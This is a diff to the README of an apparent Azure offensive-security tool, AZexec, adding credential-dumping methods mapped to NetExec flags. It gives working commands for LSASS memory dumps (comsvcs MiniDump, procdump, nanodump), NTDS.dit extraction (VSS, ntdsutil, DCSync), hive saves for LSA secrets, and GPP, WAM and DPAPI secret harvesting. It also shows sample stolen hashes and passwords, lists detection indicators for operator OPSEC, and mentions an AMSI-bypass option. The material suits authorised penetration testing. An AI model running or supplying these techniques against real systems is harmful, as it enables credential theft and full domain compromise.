@@ -134,6 +134,12 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 | `nxc smb <target> --put-file /local/file.txt \\C$\file.txt` | `.\azx.ps1 put-file -VMName "vm" -LocalPath ".\file.txt" -RemotePath "C:\file.txt"` | ✅ Required | **Upload file to target** |
 | `nxc smb <target> --sam` | `.\azx.ps1 creds -VMName "vm"` | ✅ Required | **Extract SAM hashes** (registry hive dump) |
 | `nxc smb <target> --sam` (all targets) | `.\azx.ps1 creds -AllVMs -CredMethod sam` | ✅ Required | **Extract SAM from all VMs** |
+| `nxc smb <target> --lsa` | `.\azx.ps1 creds -VMName "vm" -CredMethod lsa` | ✅ Required | **Extract LSA secrets** (service passwords, cached creds) |
+| `nxc smb <target> --ntds` | `.\azx.ps1 creds -VMName "dc" -CredMethod ntds` | ✅ Required | **Dump NTDS.dit** (DC only, VSS/ntdsutil/DCSync) |
+| `nxc smb <target> -M lsassy` | `.\azx.ps1 creds -VMName "vm" -CredMethod lsass` | ✅ Required | **LSASS memory dump** (comsvcs/procdump/nanodump) |
+| `nxc smb <target> -M backup_operator` | `.\azx.ps1 creds -VMName "vm" -CredMethod backup` | ✅ Required | **Backup Operator extraction** (SeBackupPrivilege) |
+| `nxc smb <target> --sccm` | `.\azx.ps1 creds -VMName "vm" -CredMethod sccm` | ✅ Required | **SCCM/GPP/Intune secrets** (GPP cpasswords, IIS configs) |
+| `nxc smb <target> -M wam` | `.\azx.ps1 creds -VMName "vm" -CredMethod wam` | ✅ Required | **WAM Token Broker** (AAD/TokenBroker JWTs) |
 | *N/A (Azure-specific)* | `.\azx.ps1 creds -VMName "vm" -CredMethod tokens` | ✅ Required | **Extract Managed Identity tokens** (IMDS) |
 | *N/A (Azure-specific)* | `.\azx.ps1 creds -VMName "vm" -CredMethod dpapi` | ✅ Required | **Extract DPAPI secrets** (WiFi, CredMan, browsers) |
 
@@ -1603,9 +1609,9 @@ AZR    vm-web-01            VM     PUT    C:\Windows\Temp\payload.ps1    [+] SUC
 
 ---
 
-## 🔐 Credential Extraction - NetExec --sam Equivalent
+## 🔐 Credential Extraction - NetExec --sam/--lsa/--ntds Equivalent
 
-For penetration testers familiar with NetExec's credential dumping capabilities (`--sam`), AZexec provides the **Azure cloud equivalent** through the `creds` command. This command extracts credentials from Azure VMs, Arc-enabled devices, MDE-enrolled devices, and Intune-managed devices using multiple extraction techniques.
+For penetration testers familiar with NetExec's credential dumping capabilities (`--sam`, `--lsa`, `--ntds`, `-M lsassy`, `-M backup_operator`, `--sccm`, `-M wam`), AZexec provides the **Azure cloud equivalent** through the `creds` command. This command extracts credentials from Azure VMs, Arc-enabled devices, MDE-enrolled devices, and Intune-managed devices using multiple extraction techniques.
 
 ### Supported Device Types
 
@@ -1618,12 +1624,19 @@ For penetration testers familiar with NetExec's credential dumping capabilities 
 
 ### Extraction Methods
 
-| Method | Description | Target OS | Risk Level |
-|--------|-------------|-----------|------------|
-| **sam** | SAM/SYSTEM/SECURITY registry hive extraction | Windows | HIGH - triggers MDE alerts |
-| **tokens** | Managed Identity JWT tokens from IMDS (169.254.169.254) | Windows/Linux | MEDIUM - Azure-specific |
-| **dpapi** | DPAPI secrets (WiFi PSK, Credential Manager, browser paths) | Windows | MEDIUM |
-| **all** | All extraction methods (default for `auto`) | Windows/Linux | HIGH |
+| Method | NetExec Equivalent | Description | Target OS | Risk Level |
+|--------|--------------------|-------------|-----------|------------|
+| **sam** | `nxc smb --sam` | SAM/SYSTEM/SECURITY registry hive extraction | Windows | HIGH - triggers MDE alerts |
+| **tokens** | *Azure-specific* | Managed Identity JWT tokens from IMDS (169.254.169.254) | Windows/Linux | MEDIUM - Azure-specific |
+| **dpapi** | *Azure-specific* | DPAPI secrets (WiFi PSK, Credential Manager, browser paths) | Windows | MEDIUM |
+| **lsa** | `nxc smb --lsa` | LSA secrets (service passwords, cached domain creds, machine account hash, DPAPI backup key) | Windows | HIGH |
+| **ntds** | `nxc smb --ntds [vss]` | NTDS.dit Active Directory database dump (VSS/ntdsutil/DCSync) | Windows (DC only) | CRITICAL |
+| **lsass** | `nxc smb -M lsassy` | LSASS process memory dump (comsvcs/procdump/nanodump/direct) | Windows | CRITICAL - highest detection risk |
+| **backup** | `nxc smb -M backup_operator` | SeBackupPrivilege extraction (robocopy /B for hives + optional NTDS) | Windows | HIGH |
+| **sccm** | `nxc smb --sccm` | SCCM cache, GPP cpasswords, Intune scripts, IIS configs | Windows | MEDIUM |
+| **wam** | `nxc smb -M wam` | Windows Account Manager tokens (TokenBroker, AAD Broker Plugin JWTs) | Windows | MEDIUM |
+| **all** | All of the above | All extraction methods | Windows/Linux | CRITICAL |
+| **auto** | *Conservative* | Only sam + tokens + dpapi (original behavior) | Windows/Linux | HIGH |
 
 ### NetExec to AZexec Comparison
 
@@ -1631,8 +1644,19 @@ For penetration testers familiar with NetExec's credential dumping capabilities 
 |-----------------|-------------------|-------------|
 | `nxc smb <target> --sam` | `.\azx.ps1 creds -VMName "vm-01"` | Extract SAM hashes from single target |
 | `nxc smb <targets> --sam` | `.\azx.ps1 creds -AllVMs -CredMethod sam` | Extract SAM from all VMs |
-| *N/A* | `.\azx.ps1 creds -VMName "vm-01" -CredMethod tokens` | Extract Managed Identity tokens |
-| *N/A* | `.\azx.ps1 creds -VMName "vm-01" -CredMethod dpapi` | Extract DPAPI secrets |
+| `nxc smb <target> --lsa` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod lsa` | Extract LSA secrets |
+| `nxc smb <target> --ntds` | `.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds` | Dump NTDS.dit via VSS |
+| `nxc smb <target> --ntds vss` | `.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -NTDSMethod vss` | NTDS via VSS shadow copy |
+| `nxc smb <target> --ntds --enabled` | `.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -EnabledOnly` | NTDS enabled accounts only |
+| `nxc smb <target> --ntds --user X` | `.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -TargetDomainUser X` | NTDS specific user |
+| `nxc smb <target> -M lsassy` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass` | LSASS memory dump |
+| `nxc smb <target> -M nanodump` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass -LsassMethod nanodump` | LSASS via nanodump |
+| `nxc smb <target> -M backup_operator` | `.\azx.ps1 creds -VMName "dc-01" -CredMethod backup` | Backup Operator extraction |
+| `nxc smb <target> --sccm` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod sccm` | SCCM/GPP/Intune secrets |
+| `nxc smb <target> --sccm disk` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod sccm -SCCMMethod disk` | SCCM disk search |
+| `nxc smb <target> -M wam` | `.\azx.ps1 creds -VMName "vm-01" -CredMethod wam` | WAM Token Broker extraction |
+| *N/A (Azure-specific)* | `.\azx.ps1 creds -VMName "vm-01" -CredMethod tokens` | Extract Managed Identity tokens |
+| *N/A (Azure-specific)* | `.\azx.ps1 creds -VMName "vm-01" -CredMethod dpapi` | Extract DPAPI secrets |
 | *N/A* | `.\azx.ps1 creds -DeviceName "device" -ExecMethod mde` | Extract via MDE Live Response |
 | *N/A* | `.\azx.ps1 creds -DeviceName "device" -ExecMethod intune` | Extract via Intune Remediation |
 
@@ -1644,6 +1668,34 @@ For penetration testers familiar with NetExec's credential dumping capabilities 
 .\azx.ps1 creds -VMName "vm-web-01" -CredMethod sam
 .\azx.ps1 creds -AllVMs -ResourceGroup "Production-RG"
 
+# LSA secrets (NetExec --lsa equivalent)
+.\azx.ps1 creds -VMName "dc-01" -CredMethod lsa
+.\azx.ps1 creds -AllVMs -CredMethod lsa -ExportPath lsa.json
+
+# NTDS.dit dump (NetExec --ntds equivalent) - Domain Controllers only
+.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds                          # VSS method (default)
+.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -NTDSMethod ntdsutil     # ntdsutil IFM method
+.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -NTDSMethod drsuapi      # DCSync via DSInternals
+.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -EnabledOnly              # Only enabled accounts
+.\azx.ps1 creds -VMName "dc-01" -CredMethod ntds -TargetDomainUser admin   # Specific user only
+
+# LSASS memory dump (NetExec -M lsassy equivalent)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass                         # comsvcs.dll (default)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass -LsassMethod procdump   # Via procdump
+.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass -LsassMethod nanodump   # Via nanodump
+.\azx.ps1 creds -VMName "vm-01" -CredMethod lsass -LsassMethod direct     # P/Invoke MiniDumpWriteDump
+
+# Backup Operator (NetExec -M backup_operator equivalent)
+.\azx.ps1 creds -VMName "dc-01" -CredMethod backup
+
+# SCCM/Intune secrets (NetExec --sccm equivalent)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod sccm                          # Filesystem search (default)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod sccm -SCCMMethod api          # Graph API enumeration
+
+# WAM Token Broker (NetExec -M wam equivalent)
+.\azx.ps1 creds -VMName "vm-01" -CredMethod wam
+.\azx.ps1 creds -AllVMs -CredMethod wam -ExportPath wam.json
+
 # Managed Identity token extraction (Azure-specific)
 .\azx.ps1 creds -VMName "vm-web-01" -CredMethod tokens
 .\azx.ps1 creds -AllVMs -CredMethod tokens
@@ -1651,7 +1703,7 @@ For penetration testers familiar with NetExec's credential dumping capabilities 
 # DPAPI secrets (browser creds, credential manager, WiFi)
 .\azx.ps1 creds -VMName "vm-web-01" -CredMethod dpapi
 
-# All extraction methods
+# All extraction methods (including new methods)
 .\azx.ps1 creds -VMName "vm-web-01" -CredMethod all
 
 # Arc devices
@@ -1673,6 +1725,8 @@ For penetration testers familiar with NetExec's credential dumping capabilities 
 .\azx.ps1 creds -AllVMs -ExportPath results.json
 ```
 
+> **Note**: `auto` mode runs only the conservative methods (sam + tokens + dpapi). New methods (lsa, ntds, lsass, backup, sccm, wam) must be explicitly selected. Use `-CredMethod all` to run everything.
+
 ### Execution Method Selection (`-ExecMethod`)
 
 | Value | Description |
@@ -1689,29 +1743,45 @@ For penetration testers familiar with NetExec's credential dumping capabilities 
 
 > ⚠️ **WARNING**: Credential extraction triggers security alerts!
 
-The `creds` command will display an OPSEC warning before execution:
+The `creds` command will display method-specific OPSEC warnings before execution:
 
-```
-[!] OPSEC WARNING: Credential Extraction Detection Risk
-[!] This operation may trigger:
-    - MDE: 'Credential dumping activity detected'
-    - Azure Security Center: 'Suspicious PowerShell execution'
-    - Event ID 4656/4663: SAM registry key access
-    - Event ID 4688: reg.exe execution
-[*] Use -AmsiBypass for evasion (same as exec command)
-```
+| Method | Detection Risk | Key Indicators |
+|--------|---------------|----------------|
+| **sam** | HIGH | Event ID 4656/4663 (SAM key access), Event ID 4688 (reg.exe), MDE credential dump alert |
+| **lsa** | HIGH | Event ID 4656/4663 (SECURITY hive), MDE "Suspicious registry hive export" |
+| **ntds** | CRITICAL | Event ID 8222 (shadow copy), ntdsutil alerts, MDE "AD database dump" |
+| **lsass** | CRITICAL | Event ID 10 (Sysmon LSASS access), MDE "Suspicious LSASS access" (HIGH), Credential Guard blocks |
+| **backup** | HIGH | Event ID 4672 (SeBackupPrivilege), robocopy /B execution |
+| **sccm** | MEDIUM | Event ID 4663 (SYSVOL GPP access), filesystem scanning behavioral alerts |
+| **wam** | MEDIUM | Event ID 4663 (TokenBroker cache access), AAD Broker Plugin data access |
+| **tokens** | MEDIUM | IMDS queries (169.254.169.254), Azure-specific logging |
+| **dpapi** | MEDIUM | cmdkey enumeration, netsh wlan profile queries |
+
+### External Tool Requirements
+
+| Tool | Used By | Purpose | Install |
+|------|---------|---------|---------|
+| **secretsdump.py** (Impacket) | sam, lsa, ntds, backup | Parse registry hives and NTDS.dit offline | `pip install impacket` |
+| **pypykatz** | lsass | Parse LSASS memory dumps offline | `pip install pypykatz` |
+| **DSInternals** | ntds (drsuapi) | DCSync via PowerShell on target DC | `Install-Module DSInternals` (on target) |
+
+> All methods gracefully degrade when external tools are unavailable — hives/dumps are extracted and saved locally with instructions for offline parsing.
 
 ### Sample Output
 
 ```
 [*] AZX - Credential Extraction
-[*] Command: creds (Azure equivalent of nxc smb --sam)
+[*] Command: creds (Azure equivalent of nxc smb --sam/--lsa/--ntds)
 
 [*] Target: vm-web-01 (Windows Server 2022)
 AZR    vm-web-01            443    Windows     (SAM_DUMP)
 AZR    vm-web-01            443    Windows     Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 AZR    vm-web-01            443    Windows     Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 AZR    vm-web-01            443    Windows     svc_backup:1001:aad3b435b51404ee:e52cac67419a6a9a42f8b3674a46f48b:::
+AZR    vm-web-01            443    Windows     (LSA_DUMP)
+AZR    vm-web-01            443    Windows     LSA Secret: _SC_svc_sql -> P@ssw0rd123!
+AZR    vm-web-01            443    Windows     DCC2: CORP\admin:$DCC2$10240#admin#a1b2c3d4...
+AZR    vm-web-01            443    Windows     Machine Account: CORP\VM-WEB-01$:aad3b435b51404ee:5a6b7c8d...
 AZR    vm-web-01            443    Windows     (TOKEN_DUMP)
 AZR    vm-web-01            443    Windows     MI Token: management.azure.com (expires: 3600s)
 AZR    vm-web-01            443    Windows     MI Token: graph.microsoft.com (expires: 3600s)
@@ -1719,9 +1789,21 @@ AZR    vm-web-01            443    Windows     (DPAPI_DUMP)
 AZR    vm-web-01            443    Windows     WiFi: CorpWiFi -> [PLAINTEXT] SecretKey123
 AZR    vm-web-01            443    Windows     CredMan: Domain:target=server01 -> user@domain.com
 AZR    vm-web-01            443    Windows     Browser: Chrome Login Data found (extract offline)
+AZR    vm-web-01            443    Windows     (SCCM_DUMP)
+AZR    vm-web-01            443    Windows     GPP cpassword: \\SYSVOL\Groups.xml -> svc_deploy:D3pl0yP@ss
+AZR    vm-web-01            443    Windows     IIS Config: applicationHost.config -> svc_web:WebP@ss123
+AZR    vm-web-01            443    Windows     (WAM_DUMP)
+AZR    vm-web-01            443    Windows     WAM Token: user@contoso.com -> graph.microsoft.com (exp: 2025-01-15 14:30:00 UTC)
+AZR    vm-web-01            443    Windows     WAM Token: admin@contoso.com -> management.azure.com (exp: 2025-01-15 15:00:00 UTC)
+
+[*] Target: dc-01 (Windows Server 2022)
+AZR    dc-01                443    Windows     (NTDS_DUMP)
+AZR    dc-01                443    Windows     Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+AZR    dc-01                443    Windows     krbtgt:502:aad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
+AZR    dc-01                443    Windows     Total hashes: 1247
 
 [*] EXTRACTION SUMMARY
-[*] Targets: 1 | SAM Hashes: 3 | Tokens: 2 | DPAPI Secrets: 3 | Errors: 0
+[*] Targets: 2 | SAM: 3 | LSA: 3 | Tokens: 2 | DPAPI: 3 | NTDS: 1247 | SCCM: 2 | WAM: 2 | Errors: 0
 ```
 
 ### Technical Details
@@ -1751,6 +1833,52 @@ AZR    vm-web-01            443    Windows     Browser: Chrome Login Data found 
 1. **Credential Manager**: Parse `cmdkey /list` output
 2. **WiFi Profiles**: Extract PSKs via `netsh wlan show profile key=clear`
 3. **Browser Credentials**: Identify Login Data paths for offline extraction
+
+#### LSA Secrets Extraction Workflow
+1. Export SYSTEM + SECURITY registry hives via `reg.exe save`
+2. Base64-encode hives for transfer
+3. Decode locally and parse with `secretsdump.py -security SECURITY -system SYSTEM LOCAL`
+4. Extract: LSA secrets (service account passwords), cached domain credentials (DCC2), machine account NTLM hash, DPAPI backup key
+
+#### NTDS.dit Dump Workflow
+1. **DC Detection**: Check for running NTDS service (non-DC targets get clear error)
+2. **VSS method** (default): Create Volume Shadow Copy, copy `ntds.dit` + SYSTEM from shadow path
+3. **ntdsutil method**: Run `ntdsutil "activate instance ntds" "ifm" "create full <path>"`
+4. **drsuapi method**: Use DSInternals `Get-ADReplAccount -All` for inline DCSync
+5. Large files staged for transfer via `Receive-VMFile` / `Receive-DeviceFile`
+6. Parse locally with `secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL`
+
+#### LSASS Memory Dump Workflow
+1. Get LSASS process PID
+2. **comsvcs** (default): `rundll32.exe comsvcs.dll, MiniDump <PID> <path> full`
+3. **procdump**: `procdump.exe -accepteula -ma lsass.exe <path>`
+4. **nanodump**: `nanodump.exe --write <path>`
+5. **direct**: P/Invoke `MiniDumpWriteDump` from `dbghelp.dll`
+6. Dump staged for transfer via `Receive-VMFile` (up to 200MB)
+7. Parse locally with `pypykatz lsa minidump <path>` (extracts MSV, WDigest, Kerberos)
+
+#### Backup Operator Workflow
+1. Check `SeBackupPrivilege` via `whoami /priv`
+2. Use `robocopy /B` (backup semantics) to copy SAM/SYSTEM/SECURITY
+3. If target is a DC, also stage NTDS.dit via backup semantics
+4. Base64-encode hives for transfer, parse with secretsdump
+
+#### SCCM/Intune Extraction Workflow
+1. **Disk method**: Search filesystem for:
+   - GPP cpassword files in SYSVOL (Groups.xml, Services.xml, etc.) — decrypts using Microsoft's published AES key
+   - SCCM client cache (`C:\Windows\ccmcache`) scripts/configs with embedded credentials
+   - Intune Management Extension deployed scripts with hardcoded secrets
+   - IIS `applicationHost.config` with processModel/virtualDirectory credentials
+2. **API method**: Enumerate Intune configuration profiles via Microsoft Graph API
+
+#### WAM Token Broker Workflow
+1. Enumerate all user profiles via ProfileList registry key
+2. For each user, search:
+   - TokenBroker cache (`.tbres`, `.tbacct`) in `%LOCALAPPDATA%\Microsoft\TokenBroker\Cache\`
+   - AAD Broker Plugin tokens in `%LOCALAPPDATA%\Packages\Microsoft.AAD.BrokerPlugin_*\AC\TokenBroker\Accounts\`
+   - IdentityCache for JWT patterns
+3. Decode JWT payloads (base64), extract claims (UPN, audience, scope, expiry)
+4. Enumerate DPAPI masterkey files from `%APPDATA%\Microsoft\Protect\<SID>\`
 
 #### MDE Live Response Workflow
 1. Acquire MDE API token via `Get-AzAccessToken -ResourceUrl "https://api.security.microsoft.com"`
